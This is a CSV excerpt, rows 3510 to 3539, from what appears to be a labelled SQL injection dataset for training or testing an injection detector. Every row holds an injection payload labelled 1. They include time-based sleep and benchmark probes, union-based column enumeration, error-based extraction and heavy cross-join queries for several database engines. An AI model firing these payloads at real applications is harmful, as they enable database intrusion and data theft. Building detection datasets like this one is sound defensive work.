row_index,payload_norm,label,sqli_type_hint
3510,1'+ ( select tart where 9861 = 9861,1,
3511,-9555' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'rwpq' like 'rwpq,1,
3512,"1"" ) as pydh where 3407 = 3407 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
3513,"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
3514,1 ) ) as goar where 2405 = 2405 and 5927 = 9731--,1,
3515,"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,
3516,"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'igaa' = 'igaa",1,
3517,"-2116%' ) ) ) union all select 7119,7119,7119,7119,7119--",1,
3518,1 ) where 7729 = 7729,1,
3519,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",1,
3520,"1 ) ) as zdbj where 2300 = 2300 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
3521,1'+ ( select uhsy where 4596 = 4596 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',1,
3522,"1"" ) ) as ogzn where 6849 = 6849 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
3523,-5580 or 4829 = 1968,1,
3524,"1 ) where 8630 = 8630 union all select null,null--",1,
3525,"1' in boolean mode ) union all select null,null,null,null,null,null--",1,
3526,1 ) as qkkm where 8461 = 8461,1,
3527,"1"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""vypw"" like ""vypw",1,
3528,"-5386' ) union all select 8026,8026,8026,8026,8026,8026#",1,
3529,1'|| ( select 'dajl' from dual where 8440 = 8440,1,
3530,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'mmow' = 'mmow,1,
3531,"1"" union all select null,null,null,null#",1,
3532,1' ) ) as cjjm where 1981 = 1981,1,
3533,"1"" ) where 3507 = 3507",1,
3534,1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'hokd' = 'hokd,1,
3535,"1' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
3536,1' ) where 3861 = 3861,1,
3537,"1"" ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3538,"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""grct"" = ""grct",1,
3539,"-2417 ) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1,
